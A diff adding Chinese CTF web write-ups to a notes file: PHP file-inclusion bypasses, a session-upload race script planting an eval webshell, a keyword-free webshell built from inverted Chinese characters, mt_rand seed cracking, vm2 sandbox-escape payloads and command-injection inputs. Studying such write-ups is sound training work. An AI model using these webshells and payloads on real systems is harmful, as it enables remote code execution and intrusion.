@@ -2183,6 +2183,60 @@ payload: `php://filter/convert.base64-encode/resource=index/../flag` 或 `php://
 
  payload: `\S*=${eval($_POST[cmd])}`同时再POST一个`cmd=system("ls /");` 或者 `\S*=${getFlag()}&cmd=system('ls /');`
 
+ ## WMCTF2020 Make PHP Great Again(文件包含)
+
+ 1. 源码
+
+    ```php
+    <?php
+    highlight_file(__FILE__);
+    require_once 'flag.php';
+    if(isset($_GET['file'])) {
+    require_once $_GET['file'];
+    }
+    ```
+
+    这道题文件包含用的require_once(),这个函数的特点是是包含一次，因为开始包含过一次flag.php,正常来说不能再包含了，所以需要绕过
+
+2. require_once()在对软链接的操作上存在一些缺陷，软连接层数较多会使hash匹配直接失效造成重复包含，超过20次软链接后可以绕过，外加伪协议编码一下：
+
+    ```url
+    ?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
+    ```
+
+    也可以利用PHP_SESSION_UPLOAD_PROGRESS上传文件后进行文件包含：
+
+    ```php
+    #coding=utf-8
+ 
+    import io 
+    import requests
+    import threading
+    sessid = 'TGAO'
+    data = {"cmd":"system('tac /var/www/html/flag.php');"}
+    def write(session):
+        while True:
+            f = io.BytesIO(b'a' *100* 50)
+            resp = session.post( 'http://3735466b-1305-491e-b32c-4733f9b9f113.node3.buuoj.cn/', data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_POST["cmd"]);?>'}, files={'file': ('tgao.txt',f)}, cookies={'PHPSESSID': sessid} )
+    def read(session):
+        while True:
+            resp = session.post('http://3735466b-1305-491e-b32c-4733f9b9f113.node3.buuoj.cn/?file=/tmp/sess_'+sessid,data=data)
+            if 'tgao.txt' in resp.text:
+                print(resp.text)
+                event.clear()
+            else:
+                pass
+    if __name__=="__main__":
+        event=threading.Event()
+        with requests.session() as session:
+            for i in range(1,30):
+                threading.Thread(target=write,args=(session,)).start()
+    
+            for i in range(1,30):
+                threading.Thread(target=read,args=(session,)).start()
+        event.set()
+    ```
+
 ## BUUCTF2018 Onlion Tool(RCE+文件上传漏洞)
 
 源码
@@ -3491,7 +3545,89 @@ eval($hhh);
     /upload/tmp_2c67ca1eaeadbdc1868d67003072b481/1.test?cmd=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print_r(file_get_contents('/THis_Is_tHe_F14g'));
     ```
 
+### SUCTF2018 GetShell(汉字取反)
 
+1. 源码
+
+    ```php
+    if($contents=file_get_contents($_FILES["file"]["tmp_name"])){
+        $data=substr($contents,5);
+        foreach ($black_char as $b) {
+            if (stripos($data, $b) !== false){
+                die("illegal char");
+            }
+        }     
+    } 
+    ```
+    检查文件内容（内容前五位不检查），内容中有匹配到黑名单的输出illegal char
+
+    文件上传成功后会修改文件后缀为php，那么就需要构造一个webshell成功上传即可
+
+    通过fuzz得知。不能有a-zA-Z0-9?<>^@#!%&*空格
+
+    fuzz脚本
+
+    ```php
+    # -*- coding:utf-8 -*-
+    # Author: m0c1nu7
+    import requests
+
+    def ascii_str():
+        str_list=[]
+        for i in range(33,127):
+            str_list.append(chr(i))
+        #print('可显示字符：%s'%str_list)
+        return str_list
+
+    def upload_post(url):
+        str_list = ascii_str()
+        for str in str_list:
+            header = {
+            'Host':'3834350a-887f-4ac1-baa4-954ab830c879.node3.buuoj.cn',
+            'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0',
+            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+            'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
+            'Accept-Encoding':'gzip, deflate',
+            'Content-Type':'multipart/form-data; boundary=---------------------------339469688437537919752303518127'
+            }
+            post = '''-----------------------------339469688437537919752303518127
+    Content-Disposition: form-data; name="file"; filename="test.txt"
+    Content-Type: text/plain
+
+    12345'''+str+'''
+    -----------------------------339469688437537919752303518127
+    Content-Disposition: form-data; name="submit"
+
+    提交			
+    -----------------------------339469688437537919752303518127--'''
+
+            res = requests.post(url,data=post.encode('UTF-8'),headers=header)
+            if 'Stored' in res.text:
+                print("该字符可以通过:  {0}".format(str))
+            else:
+                print("过滤字符:  {0}".format(str))
+                
+
+
+    if __name__ == '__main__':
+        url = 'http://3834350a-887f-4ac1-baa4-954ab830c879.node3.buuoj.cn/index.php?act=upload'
+        upload_post(url)
+    ```
+
+2. 利用中文getshell
+
+    ```php
+    <?=
+    $__=[];
+    $____=$__==$__;
+    #$____=1,利用php弱类型，True==1
+    $_=~(北)[$____];$_.=~(熙)[$____];$_.=~(北)[$____];$_.=~(拾)[$____];$_.=~(的)[$____];$_.=~(和)[$____];
+    #system
+    $___=~(样)[$____];$___.=~(说)[$____];$___.=~(小)[$____];$___.=~(次)[$____];$___.=~(站)[$____];$____=~(瞰)[$____];
+    #_POST
+    $_($$___[$_]);
+    #system($_POST[system]);
+    ```
 
 ## SUCTF2019 Pythonnginx(IDNA编码绕过)
 
@@ -4157,7 +4293,9 @@ eval($hhh);
     `ls`
     ```
 
-## GWCTF 2019 枯燥的抽奖(伪随机数爆破)
+## 随机数爆破
+
+### GWCTF 2019 枯燥的抽奖(伪随机数爆破)
 
 **本题会用到一个爆破工具 php_mt_seed, 用来爆破生成随机数的种子**
 
@@ -4262,7 +4400,141 @@ eval($hhh);
     ```
     将得到的结果输入即可返回flag
 
+### MRCTF2020 Ezaudit
+
+1. 进入看了一下源码，没有发现什么有用的信息。然后就是扫描目录，发现源码备份www.zip
+
+    ```php
+    <?php 
+    header('Content-type:text/html; charset=utf-8');
+    error_reporting(0);
+    if(isset($_POST['login'])){
+        $username = $_POST['username'];
+        $password = $_POST['password'];
+        $Private_key = $_POST['Private_key'];
+        if (($username == '') || ($password == '') ||($Private_key == '')) {
+            // 若为空,视为未填写,提示错误,并3秒后返回登录界面
+            header('refresh:2; url=login.html');
+            echo "用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!";
+            exit;
+    }
+        else if($Private_key != '*************' )
+        {
+            header('refresh:2; url=login.html');
+            echo "假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!";
+            exit;
+        }
+
+        else{
+            if($Private_key === '************'){
+            $getuser = "SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'".';'; 
+            $link=mysql_connect("localhost","root","root");
+            mysql_select_db("test",$link);
+            $result = mysql_query($getuser);
+            while($row=mysql_fetch_assoc($result)){
+                echo "<tr><td>".$row["username"]."</td><td>".$row["flag"]."</td><td>";
+            }
+        }
+        }
+
+    } 
+    // genarate public_key 
+    function public_key($length = 16) {
+        $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+        $public_key = '';
+        for ( $i = 0; $i < $length; $i++ )
+        $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);
+        return $public_key;
+    }
+
+    //genarate private_key
+    function private_key($length = 12) {
+        $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+        $private_key = '';
+        for ( $i = 0; $i < $length; $i++ )
+        $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);
+        return $private_key;
+    }
+    $Public_key = public_key();
+    //$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???
+    ```
+    首先是验证私钥private_key,通过后回查数据库，但必须输入正确的密码(*这里可以用万能密码绕过*)。所以目前的重点是获取私钥
+
+    接着下面两个函数分别是生成公钥和私钥的，函数中用到一个mt_rand函数用来生成随机数，到这和之前的一道题目相似 [GWCTF 2019 枯燥的抽奖(伪随机数爆破)](#gwctf-2019-枯燥的抽奖伪随机数爆破),需要先把种子爆破出来，要用php_mt_seed工具
+
+2. 私钥爆破
+
+    1. 把公钥转化为php_mt_seed可以识别的数据
+
+        ```php
+        <?php
+        $source = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+        $target = 'oBQ5bGllcU';
+        for ($i = 0; $i < strlen($target); $i++){
+            echo strpos($source, $target[$i])." ".strpos($source, $target[$i])." "."0"." ".strlen($source)-1." ";
+        }
+        ?>
+        ```
+
+    2. 爆破seed
+
+        ```bash
+        lsz@LSZ-TOP:/mnt/f/ProgramFiles/ctf/php_mt_seed-4.0$ ./php_mt_seed 36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61
+        Pattern: EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62
+        Version: 3.0.7 to 5.2.0
+        Found 0, trying 0xfc000000 - 0xffffffff, speed 901.5 Mseeds/s
+        Version: 5.2.1+
+        Found 0, trying 0x68000000 - 0x69ffffff, speed 42.5 Mseeds/s
+        seed = 0x69cf57fb = 1775196155 (PHP 5.2.1 to 7.0.x; HHVM)
+        Found 1, trying 0xfe000000 - 0xffffffff, speed 38.1 Mseeds/s
+        Found 1
+        ```
+
+    3. 获取私钥
+
+        ```php
+        <?php
+        $seed = '1775196155';
+
+        mt_srand($seed);
+
+        // genarate public_key 
+        function public_key($length = 16) {
+            $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+            $public_key = '';
+            for ( $i = 0; $i < $length; $i++ )
+            $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);
+            return $public_key;
+        }
+
+        //genarate private_key
+        function private_key($length = 12) {
+            $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+            $private_key = '';
+            for ( $i = 0; $i < $length; $i++ )
+            $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);
+            return $private_key;
+        }
+
+        public_key();
+        echo private_key();
+        ```
+
+        *注意：两个函数必须都跑一下，不然生成的私钥只是公钥的前12位*
+
+        至于原因，在生成私钥之前先生成了公钥，生成公钥的时候已经调用过mt_rand函数，生成私钥的时候其实是第二次调用mt_rand函数。就相当于用mt_rand函数一共生成了28位随机数，但是公钥用的是前16位，后12位才是生成私钥用的。
+
 ## SQLi-二次注入
+
+### b01lers2020 Life on Mars
+
+这道题不是二次注入，是个普通的注入题目，从这道题学到一个新的知识点
+
+**从information表查数据库名**
+----------------------------
+```sql
+select group_concat(schema_name) from information_schema.schemata;
+```
 
 ### RCTF2015-EasySQL(二次注入+报错注入)
 
@@ -5339,3 +5611,128 @@ base32解码得到1nD3x.php
 任意文件下载：设计->主题->自定义->导出主题，抓包，theme名称就是文件名的base64加密后的内容，可以更改为/flag的base64加密后的内容，用bp重放模块就可以在响应处直接看到flag
 
 RCE：在高级修改模板文件内容为RCE代码就能拿到flag，或者写个木马，蚁剑连接也行。
+
+## Js-vm2沙箱逃逸
+
+### HFCTF2020 JustEscape
+
+#### 解题思路
+
+首页有数学运算公式和一个获取当前时间的功能，还提示了一个"真的是php"，看到这可以考虑其他的语言了
+
+node.js中也有eval函数
+
+使用Error().stack测试，回显了报错信息，发现是vm2沙箱逃逸
+
+[vm2沙箱逃逸poc](https://github.com/patriksimek/vm2/issues/225)
+
+直接用会被waf拦截
+
+#### Js关键字过滤绕过
+
+1. payload1
+
+    测试得到以下字符被过滤了
+
+    ['for', 'while', 'process', 'exec', 'eval', 'constructor', 'prototype', 'Function', '+', '"',''']
+
+    prototype被过滤了，就可以换成
+
+    `${`${`prototyp`}e`}`
+
+    ```js
+    (function (){
+        TypeError[`${`${`prototyp`}e`}`][`${`${`get_pro`}cess`}`] = f=>f[`${`${`constructo`}r`}`](`${`${`return proc`}ess`}`)();
+        try{
+            Object.preventExtensions(Buffer.from(``)).a = 1;
+        }catch(e){
+            return e[`${`${`get_pro`}cess`}`](()=>{}).mainModule[`${`${`requir`}e`}`](`${`${`child_proces`}s`}`)[`${`${`exe`}cSync`}`](`cat /flag`).toString();
+        }
+    })()
+    ```
+
+2. payload2(join字符串拼接)
+
+    ```js
+    (()=>{ TypeError[[`p`,`r`,`o`,`t`,`o`,`t`,`y`,`p`,`e`][`join`](``)][`a`] = f=>f[[`c`,`o`,`n`,`s`,`t`,`r`,`u`,`c`,`t`,`o`,`r`][`join`](``)]([`r`,`e`,`t`,`u`,`r`,`n`,` `,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))(); try{ Object[`preventExtensions`](Buffer[`from`](``))[`a`] = 1; }catch(e){ return e[`a`](()=>{})[`mainModule`][[`r`,`e`,`q`,`u`,`i`,`r`,`e`][`join`](``)]([`c`,`h`,`i`,`l`,`d`,`_`,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))[[`e`,`x`,`e`,`c`,`S`,`y`,`n`,`c`][`join`](``)](`cat /flag`)[`toString`](); } })()
+    ```
+
+## 极客大挑战 2020 Roamphp1-Welcome
+
+进去提示405 Method Not Allowed，因为一开始用的get方法，get不行就换post试一下，post可以看到了源码
+
+```php
+<?php
+error_reporting(0);
+if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
+header("HTTP/1.1 405 Method Not Allowed");
+exit();
+} else {
+    
+    if (!isset($_POST['roam1']) || !isset($_POST['roam2'])){
+        show_source(__FILE__);
+    }
+    else if ($_POST['roam1'] !== $_POST['roam2'] && sha1($_POST['roam1']) === sha1($_POST['roam2'])){
+        phpinfo();  // collect information from phpinfo!
+    }
+} 
+```
+
+第一层if(请求方法)过去了，绕后就是第二层if(要求两个字符串原始值不一样，sha1加密后一样)数组绕过，传入两个数组就行了
+
+flag在phpinfo页面里面，需要找一下。
+
+## EasyBypass
+
+简单的正则匹配绕过，这里主要记录一下解题思路
+
+进去就是源码
+
+```php
+<?php
+
+highlight_file(__FILE__);
+
+$comm1 = $_GET['comm1'];
+$comm2 = $_GET['comm2'];
+
+
+if(preg_match("/\'|\`|\\|\*|\n|\t|\xA0|\r|\{|\}|\(|\)|<|\&[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is", $comm1))
+    $comm1 = "";
+if(preg_match("/\'|\"|;|,|\`|\*|\\|\n|\t|\r|\xA0|\{|\}|\(|\)|<|\&[^\d]|@|\||ls|\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w/is", $comm2))
+    $comm2 = "";
+
+$flag = "#flag in /flag";
+
+$comm1 = '"' . $comm1 . '"';
+$comm2 = '"' . $comm2 . '"';
+
+$cmd = "file $comm1 $comm2";
+system($cmd);
+?>
+```
+
+file命令返回文件类型。
+
+一开始想着从comm2入手，在comm2上构造payload，但是试了几次后comm2总是被替换成空，后来一想从comm1也可以构造payload
+
+payload
+```url
+comm1=";head+/fla*;"
+```
+经过处理后comm1就变成了
+```sh
+"";head /fla*;"" ;
+```
+最后执行的命令就是
+cmd:
+```sh
+file "";head /fla*;"" ;
+```
+不知道为什么代码里面过滤了"*",但是构造payload时仍然可以用。这里有点看不懂
+
+看其他wp的payload：
+```php
+?comm1=index.php";tac /fla?;"&comm2
+```
+?表示任意一个字符，从而来绕过flag的匹配。
